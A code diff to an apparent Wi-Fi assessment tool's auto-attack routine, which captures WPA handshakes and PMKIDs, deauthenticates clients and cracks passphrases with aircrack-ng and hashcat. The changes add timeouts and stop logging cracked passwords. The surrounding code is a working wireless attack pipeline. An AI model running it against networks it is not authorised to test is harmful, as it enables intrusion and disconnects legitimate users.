@@ -19,6 +19,11 @@ from attacks.commands import (
     hcxdumptool_capture,
     hcxpcapngtool_convert,
 )
+from attacks.parsers import (
+    extract_hashcat_password_for_bssid,
+    extract_wifi_password,
+    has_aircrack_handshake,
+)
 from wifi.playbook import recommend_assessment
 
 
@@ -92,26 +97,26 @@ def run_auto_hack_single_network(app, bssid, network, session_dir, wordlist, att
                 bssid=bssid,
                 output_prefix=handshake_file,
             ),
+            stdin=subprocess.DEVNULL,
             stdout=subprocess.DEVNULL,
-            stderr=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
         )
 
         time.sleep(1)
         if dump_proc.poll() is not None:
-            stderr = dump_proc.stderr.read().decode() if dump_proc.stderr else "Unknown error"
-            app.logger.error(f"Failed to start airodump-ng for {ssid}: {stderr}")
+            app.logger.error(f"Failed to start airodump-ng for {ssid} (code {dump_proc.returncode})")
             result["status_message"] = "[error]Failed to start handshake capture [/]"
 
         pmkid_proc = subprocess.Popen(
             hcxdumptool_capture(app.interface_name, pmkid_pcapng, channel),
+            stdin=subprocess.DEVNULL,
             stdout=subprocess.DEVNULL,
-            stderr=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
         )
 
         time.sleep(1)
         if pmkid_proc.poll() is not None:
-            stderr = pmkid_proc.stderr.read().decode() if pmkid_proc.stderr else "Unknown error"
-            app.logger.error(f"Failed to start hcxdumptool for {ssid}: {stderr}")
+            app.logger.error(f"Failed to start hcxdumptool for {ssid} (code {pmkid_proc.returncode})")
             result["pmkid_status"] = "[red]Failed to start PMKID capture[/]"
 
         with open(session_dir / "auto_hack_report.txt", "a") as f:
@@ -173,7 +178,12 @@ def run_auto_hack_single_network(app, bssid, network, session_dir, wordlist, att
             if not handshake_found:
                 cap_files = list(network_dir.glob(f"{handshake_file.name}*.cap"))
                 if cap_files:
-                    check_result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
+                    check_result = subprocess.run(
+                        aircrack_check(cap_files[0]),
+                        capture_output=True,
+                        text=True,
+                        timeout=30,
+                    )
                     if has_aircrack_handshake(check_result.stdout):
                         is_valid_handshake = app._verify_handshake(cap_files[0], bssid, ssid)
                         if is_valid_handshake:
@@ -210,6 +220,7 @@ def run_auto_hack_single_network(app, bssid, network, session_dir, wordlist, att
                         aireplay_deauth(app.interface_name, bssid=bssid, count=3, client=client),
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
+                        timeout=10,
                     )
 
             if elapsed_time >= min_capture_time and (handshake_found or pmkid_found):
@@ -229,13 +240,18 @@ def run_auto_hack_single_network(app, bssid, network, session_dir, wordlist, att
             cap_files = list(network_dir.glob(f"{handshake_file.name}*.cap"))
             if cap_files:
                 app.logger.info(f"Attempting to crack handshake for {ssid}")
-                crack_result = subprocess.run(aircrack_crack(cap_files[0], wordlist), capture_output=True, text=True)
+                crack_result = subprocess.run(
+                    aircrack_crack(cap_files[0], wordlist),
+                    capture_output=True,
+                    text=True,
+                    timeout=600,
+                )
                 password = extract_wifi_password(crack_result.stdout, include_hashcat=False)
                 if password:
                     password_found = True
                     result["password"] = password
                     result["status_message"] = "[success]Assessment successful - passphrase recovered."
-                    app.logger.info(f"Password found from handshake for {ssid}: {password}")
+                    app.logger.info(f"Passphrase recovered from handshake for {ssid}")
 
         if not password_found and pmkid_found and wordlist:
             _report_attack(time.time() - capture_start_time, "Cracking PMKID (hashcat)")
@@ -245,13 +261,14 @@ def run_auto_hack_single_network(app, bssid, network, session_dir, wordlist, att
                     hashcat_crack(pmkid_22000, wordlist, mode=22000, workload=0, status=True, potfile_disable=True),
                     capture_output=True,
                     text=True,
+                    timeout=600,
                 )
                 password = extract_hashcat_password_for_bssid(hashcat_result.stdout, bssid)
                 if password:
                     password_found = True
                     result["password"] = password
                     result["status_message"] = "[success]Assessment successful - passphrase recovered."
-                    app.logger.info(f"Password found from PMKID for {ssid}: {password}")
+                    app.logger.info(f"Passphrase recovered from PMKID for {ssid}")
 
         if not password_found:
             if handshake_found or pmkid_found:
